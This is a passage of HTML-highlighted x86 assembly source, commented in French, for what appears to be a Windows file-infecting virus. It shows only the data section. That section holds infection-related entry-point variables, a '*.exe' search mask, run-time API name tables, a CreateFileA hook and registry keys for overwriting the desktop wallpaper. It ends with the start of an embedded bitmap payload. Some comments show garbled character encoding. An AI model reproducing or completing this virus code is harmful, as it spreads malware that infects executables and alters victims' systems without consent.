</span><span class="sc5">kernel32</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">user32</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">advapi32</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PeHeader</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Fonctions</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Names</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Ordinals</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SearchHandle</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">handle</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Fsize</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">byteread</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ITD</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">THEENTRYPOINT</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;VA de retour vers l'hÙte</span><span class="sc0">
</span><span class="sc5">AENTRYPOINT</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;Idem mais servant lors de l'infection (donc ÈcrasÈ)</span><span class="sc0">
</span><span class="sc5">IMAGEBASE</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">secheader</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">HookDirectory</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Current_Dir</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Win_Dir</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Sys_Dir</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">lebitmap</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"c:\neo.bmp"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">lenotepad</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"\NOTEPAD.EXE"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">lecalc</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"\CALC.EXE"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">leexplorer</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"\EXPLORER.EXE"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">lerunonce</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"\RUNONCE.EXE"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">time</span><span class="sc0">            </span><span class="sc5">SYSTEMTIME</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; structure systemtime</span><span class="sc0">
</span><span class="sc5">search</span><span class="sc0">          </span><span class="sc5">win32_find_data</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; structure de recherche</span><span class="sc0">
</span><span class="sc5">exestr</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"*.exe"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">keydesktop</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Control Panel\Desktop"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">keycolor</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Control Panel\Colors"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">keytile</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"TileWallpaper"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">keystyle</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"WallpaperStyle"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">keyfile</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Wallpaper"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">keyback</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Background"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">keytilevalue</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"0"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">keynoir</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"0 0 0"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">keyhandle</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;__--==*** Apis dans Kernel32.dll ***==--__</span><span class="sc0">
</span><span class="sc1">;˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘</span><span class="sc0">

</span><span class="sc5">NGetProcAddress</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"GetProcAddress"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NExitProcess</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"ExitProcess"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NGetModuleHandleA</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"GetModuleHandleA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NGetCurrentDirectoryA</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"GetCurrentDirectoryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NFindFirstFileA</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"FindFirstFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NFindNextFileA</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"FindNextFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NCreateFileA</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"CreateFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NGetFileSize</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"GetFileSize"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NLocalAlloc</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"LocalAlloc"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NReadFile</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"ReadFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NSetFilePointer</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"SetFilePointer"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NWriteFile</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"WriteFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NCloseHandle</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"CloseHandle"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NLocalFree</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"LocalFree"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NGetLocalTime</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"GetLocalTime"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NSetCurrentDirectoryA</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"SetCurrentDirectoryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NGetWindowsDirectoryA</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"GetWindowsDirectoryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NGetSystemDirectoryA</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"GetSystemDirectoryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">

</span><span class="sc5">AGetProcAddress</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">AExitProcess</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">AGetModuleHandleA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">AGetCurrentDirectoryA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">AFindFirstFileA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">AFindNextFileA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ACreateFileA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">AGetFileSize</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ALocalAlloc</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">AReadFile</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ASetFilePointer</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">AWriteFile</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ACloseHandle</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ALocalFree</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">AGetLocalTime</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ASetCurrentDirectoryA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">AGetWindowsDirectoryA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">AGetSystemDirectoryA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">


</span><span class="sc1">;__--==*** Apis dans User32.dll ***==--__</span><span class="sc0">
</span><span class="sc1">;˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘</span><span class="sc0">
</span><span class="sc5">Nuser32</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"User32.dll"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">NMessageBoxA</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"MessageBoxA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> 
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
</span><span class="sc5">AMessageBoxA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">


</span><span class="sc1">;__--==*** Apis dans Advapi32.dll ***==--__</span><span class="sc0">
</span><span class="sc1">;˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘</span><span class="sc0">

</span><span class="sc5">NAdvapi32</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Advapi32.dll"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">NRegOpenKeyExA</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"RegOpenKeyExA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NRegSetValueExA</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"RegSetValueExA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">

</span><span class="sc5">ARegOpenKeyExA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ARegSetValueExA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">



</span><span class="sc1">;__--==*** HOOK des Apis  ***==--__</span><span class="sc0">
</span><span class="sc1">;˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘</span><span class="sc0">
</span><span class="sc5">NhookCreateFileA</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"CreateFileA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">

</span><span class="sc5">AhookCreateFileA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">hookCreateFileA</span><span class="sc0">

</span><span class="sc5">_hookCreateFileA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc1">;__--==*** The Bitmap File  ***==--__</span><span class="sc0">
</span><span class="sc1">;˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘</span><span class="sc0">

</span><span class="sc5">bitmap_start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">042h</span><span class="sc4">,</span><span class="sc2">04Dh</span><span class="sc4">,</span><span class="sc2">086h</span><span class="sc4">,</span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">076h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">028h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">014h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">008h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">018h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">029h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">039h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">04Ah</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">08Bh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0ADh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0C9h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0E2h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0EFh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F7h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">07Fh</span><span class="sc4">,</span><span class="sc2">060h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
